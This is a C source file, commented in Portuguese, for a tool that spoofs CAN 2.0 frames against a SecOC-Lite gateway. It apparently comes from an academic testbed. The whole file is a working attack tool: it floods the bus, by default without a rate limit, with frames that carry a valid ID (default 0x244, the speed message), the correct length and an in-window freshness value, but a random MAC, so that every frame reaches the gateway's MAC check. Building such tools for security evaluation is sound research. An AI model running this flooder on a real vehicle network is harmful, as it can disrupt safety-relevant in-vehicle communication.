/*
 * spoof_wellformed_classic.c — spoofing BEM-FORMADO para o gateway SecOC
 * clássico (CAN 2.0). 
 *
 * Emite frames CAN 2.0 com ID associado válido, comprimento secured correto
 * (plain_len + SECOC_OVERHEAD = 5 + 3 = 8 para o SPEED) e FV DENTRO da janela
 * de freshness, mas com MAC inválido. O frame passa ID -> LEN -> FV e bate no
 * MAC, onde falha (o atacante não tem a chave).
 */

#define _GNU_SOURCE
#include <errno.h>
#include <getopt.h>
#include <net/if.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include <linux/can.h>
#include <linux/can/raw.h>

/* Perfil clássico do SecOC-Lite (espelha secoc.h no build do HICSS) */
#define DEF_OVERHEAD 3   /* SECOC_FV_LEN(1) + SECOC_MAC_LEN(2) */

static volatile sig_atomic_t g_stop = 0;
static void on_sig(int s) { (void)s; g_stop = 1; }

static uint64_t now_us(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000ULL + (uint64_t)ts.tv_nsec / 1000ULL;
}

static void fill_garbage(uint8_t *p, int n, uint32_t *st)
{
    for (int i = 0; i < n; i++) {
        *st = *st * 1103515245u + 12345u;
        p[i] = (uint8_t)(*st >> 16);
    }
}

static int open_can_socket(const char *iface)
{
    int s = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (s < 0) { perror("socket(PF_CAN)"); return -1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "ioctl(%s): %s\n", iface, strerror(errno));
        close(s); return -1;
    }
    struct sockaddr_can addr;
    memset(&addr, 0, sizeof(addr));
    addr.can_family  = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "bind(%s): %s\n", iface, strerror(errno));
        close(s); return -1;
    }
    return s;
}

static void usage(const char *p)
{
    fprintf(stderr,
        "Uso: %s [opcoes]\n"
        "      --iface <if>     interface (default vcan0)\n"
        "      --id <0xNNN>     ID associado alvo (default 0x244)\n"
        "      --plain-len <n>  = expected_plain_len do build do gateway (default 5)\n"
        "      --overhead <n>   SECOC_OVERHEAD (default %d)\n"
        "      --fv <n>         FV em claro (1 byte), dentro da janela (default 0)\n"
        "  -r, --rate <fps>     limite de envio (0 = flood; default 0)\n"
        "  -d, --duration <s>   duracao em s (default 30)\n",
        p, DEF_OVERHEAD);
}

int main(int argc, char **argv)
{
    const char *iface = "vcan0";
    canid_t id        = 0x244;
    int   plain_len   = 5;
    int   overhead    = DEF_OVERHEAD;
    uint32_t fv       = 0;
    int   duration    = 30;
    long  rate        = 0;

    static struct option opts[] = {
        {"iface",     required_argument, 0, 'i'},
        {"id",        required_argument, 0, 1000},
        {"plain-len", required_argument, 0, 1001},
        {"overhead",  required_argument, 0, 1002},
        {"fv",        required_argument, 0, 1003},
        {"rate",      required_argument, 0, 'r'},
        {"duration",  required_argument, 0, 'd'},
        {"help",      no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };
    int c;
    while ((c = getopt_long(argc, argv, "i:r:d:h", opts, NULL)) != -1) {
        switch (c) {
        case 'i':  iface = optarg; break;
        case 1000: id = (canid_t)strtoul(optarg, NULL, 0); break;
        case 1001: plain_len = atoi(optarg); break;
        case 1002: overhead = atoi(optarg); break;
        case 1003: fv = (uint32_t)strtoul(optarg, NULL, 0); break;
        case 'r':  rate = atol(optarg); break;
        case 'd':  duration = atoi(optarg); break;
        case 'h':  usage(argv[0]); return 0;
        default:   usage(argv[0]); return 2;
        }
    }
    id &= CAN_SFF_MASK;
    int secured_len = plain_len + overhead;
    if (secured_len < 0 || secured_len > CAN_MAX_DLEN) {
        fprintf(stderr, "secured_len=%d fora de 0..8 (CAN 2.0). plain=%d overhead=%d\n",
                secured_len, plain_len, overhead);
        return 2;
    }

    signal(SIGINT,  on_sig);
    signal(SIGTERM, on_sig);

    int tx = open_can_socket(iface);
    if (tx < 0) return 1;

    /* Frame constante: ID valido, len correto, payload+MAC lixo, FV na janela. */
    struct can_frame f;
    memset(&f, 0, sizeof(f));
    f.can_id  = id;
    f.can_dlc = (uint8_t)secured_len;
    uint32_t rng = 0xC0FFEEu ^ (uint32_t)id ^ (uint32_t)plain_len;
    fill_garbage(f.data, secured_len, &rng);   /* payload + FV + MAC lixo */
    f.data[plain_len] = (uint8_t)(fv & 0xFF);  /* sobrescreve FV (1 byte) com valor valido */

    fprintf(stderr,
        "[spoof-wf] iface=%s ID=0x%03X plain=%d secured=%d fv=%u rate=%ld\n",
        iface, id, plain_len, secured_len, fv, rate);

    uint64_t t0 = now_us();
    uint64_t tend = t0 + (uint64_t)duration * 1000000ULL;
    uint64_t next_send = t0;
    uint64_t interval = (rate > 0) ? (1000000ULL / (uint64_t)rate) : 0;
    uint64_t sent = 0;

    while (!g_stop) {
        uint64_t now = now_us();
        if (now >= tend) break;
        if (rate > 0) {
            if (now < next_send) continue;
            next_send += interval;
        }
        ssize_t w = write(tx, &f, sizeof(f));
        if (w == (ssize_t)sizeof(f)) sent++;
        else if (w < 0 && errno == ENOBUFS) usleep(50);  /* fila cheia */
    }

    double el = (now_us() - t0) / 1e6;
    fprintf(stderr,
        "\n[spoof-wf] fim: ID=0x%03X secured=%d dur=%.2fs enviados=%llu (%.0f fps)\n",
        id, secured_len, el, (unsigned long long)sent, el > 0 ? sent / el : 0.0);

    close(tx);
    return 0;
}
